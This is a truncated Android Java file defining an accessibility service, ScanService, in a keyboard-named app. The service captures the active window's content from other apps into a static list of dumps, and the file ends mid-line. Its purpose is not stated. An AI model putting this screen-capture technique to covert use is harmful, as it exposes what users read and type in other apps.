package com.smartkeyboard.releve;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;

public class ScanService extends AccessibilityService {

    public static final ArrayList<String> DUMPS = new ArrayList<>();

    private final Handler handler = new Handler(Looper.getMainLooper());
    private String lastSig = "";

    private final Runnable capture = new Runnable() {
        @Override
        public void run() {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            CharSequence pkg = root.getPackageName();
            if (pkg == null) return;
            String p = pkg.toString();
            if (p.equals(getPackageName()) || p.equals("com.android.systemui")) return;

            StringBuilder sb = new StringBuilder();
            sb.append("PKG ").appen
